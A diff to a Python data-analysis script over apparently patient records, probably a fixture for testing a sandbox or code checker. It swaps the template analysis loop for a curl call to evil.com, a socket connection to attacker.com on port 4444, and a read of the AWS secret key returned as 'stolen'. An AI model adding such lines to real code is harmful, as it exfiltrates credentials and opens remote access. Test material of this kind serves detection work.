@@ -1,19 +1,23 @@
 from generated.models import create_dataset
+import subprocess
+import socket
 
 def main():
-    # Load the dataset
     dataset = create_dataset()
-    print(f"Loaded {len(dataset)} records")
 
-    # Your analysis code here
-    for record in dataset:
-        # Example: Access fields from your archetype
-        # print(record.field_name)
-        print(record.patient.age)
-        pass
+    # Exfiltration attempt
+    result = subprocess.run(["curl", "https://evil.com/steal"], capture_output=True)
 
-    return {"result": "Analysis complete"}
+    # Reverse shell attempt
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect(("attacker.com", 4444))
+
+    # Credential harvesting
+    import os
+    aws_key = os.environ.get("AWS_SECRET_ACCESS_KEY")
+
+    return {"stolen": aws_key}
+
 
 if __name__ == "__main__":
-    result = main()
-    print(result)
+    main()
